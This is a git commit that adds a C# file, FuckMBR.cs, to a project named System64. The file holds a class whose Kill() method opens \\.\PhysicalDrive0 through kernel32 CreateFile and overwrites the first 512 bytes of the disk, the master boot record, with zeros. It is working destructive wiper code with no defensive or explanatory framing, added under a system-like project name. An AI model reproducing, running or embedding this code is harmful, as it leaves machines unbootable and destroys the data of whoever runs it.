8f7fe76c4d1aa8f3207fb715895c486065bc2ec0
bl4ckarmy <itsblevinstyler@gmail.com>
2023-03-04 22:26:50 +0200

    gasgas

---
+++ System64/System64/FuckMBR.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace System64
+{
+    public class FuckMBR
+    {
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(
+            string lpFileName,
+            uint dwDesiredAccess,
+            uint dwShareMode,
+            IntPtr lpSecurityAttributes,
+            uint dwCreationDisposition,
+            uint dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
+
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToWrite,
+            out uint lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
+
+        private const uint GenericRead = 0x80000000;
+        private const uint GenericWrite = 0x40000000;
+        private const uint GenericExecute = 0x20000000;
+        private const uint GenericAll = 0x10000000;
+
+        //dwShareMode
+        private const uint FileShareRead = 0x1;
+        private const uint FileShareWrite = 0x2;
+
+        //dwCreationDisposition
+        private const uint OpenExisting = 0x3;
+
+        //dwFlagsAndAttributes
+        private const uint FileFlagDeleteOnClose = 0x4000000;
+
+        private const uint MbrSize = 512u;
+
+        public static void Kill()
+        {
+            var mbrData = new byte[MbrSize];
+
+            var mbr = CreateFile(
+                "\\\\.\\PhysicalDrive0",
+                GenericAll,
+                FileShareRead | FileShareWrite,
+                IntPtr.Zero,
+                OpenExisting,
+                0,
+                IntPtr.Zero);
+
+            WriteFile(
+                mbr,
+                mbrData,
+                MbrSize,
+                out uint lpNumberOfBytesWritten,
+                IntPtr.Zero);
+        }
+    }
+}
